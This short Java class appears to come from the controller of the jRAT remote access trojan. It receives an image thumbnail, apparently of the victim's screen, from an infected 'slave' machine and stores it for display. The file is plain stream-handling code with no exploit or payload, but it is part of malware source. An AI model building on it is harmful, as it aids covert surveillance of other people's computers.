package jrat.controller.packets.incoming;

import jrat.common.utils.ImageUtils;
import jrat.controller.Slave;
import java.awt.image.BufferedImage;
import java.io.DataInputStream;
import javax.swing.ImageIcon;

public class Packet33Thumbnail extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		byte[] buffer = new byte[dis.readInt()];
		slave.getDataInputStream().readFully(buffer);
		
		BufferedImage image = ImageUtils.decodeImage(buffer);
		slave.setThumbnail(new ImageIcon(image));
	}

}